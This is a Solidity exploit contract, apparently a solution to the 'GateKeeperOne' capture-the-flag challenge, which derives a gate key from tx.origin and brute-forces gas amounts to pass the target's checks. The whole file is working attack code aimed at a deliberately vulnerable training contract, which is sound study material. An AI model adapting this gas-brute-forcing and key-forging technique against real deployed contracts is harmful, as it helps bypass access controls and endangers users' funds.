// SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.0;
import "../../src/GateKeeperOne/GateKeeperOne.sol";

contract GateKeeperOneExploit {
    GateKeeperOne victim;

    constructor(address _victim) {
        victim = GateKeeperOne(_victim);
    }

    function hack() public {
        uint16 keyPart = uint16(uint160(tx.origin));
        bytes8 gateKey = bytes8(uint64(uint64(1) << 32) | uint64(keyPart));

        for (uint256 i = 0; i < 8191; i++) {
            (bool success, ) = address(victim).call{gas: 8191 * 3 + i}(
                abi.encodeWithSignature("enter(bytes8)", gateKey)
            );
            if (success) {
                break;
            }
        }
    }

    receive() external payable {}
}